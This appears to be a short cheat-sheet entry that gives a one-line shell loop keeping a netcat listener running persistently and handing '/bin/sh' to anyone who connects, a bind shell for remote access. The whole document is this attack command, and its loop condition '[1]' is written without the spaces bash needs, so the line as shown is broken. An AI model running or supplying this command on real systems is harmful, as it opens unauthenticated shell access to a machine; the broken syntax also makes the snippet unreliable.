### Netcat listener persistent on UNIX and Linux by using a while loop
```
while [1]; do echo 'Started'; nc -l -p [port] -e /bin/sh; done
```
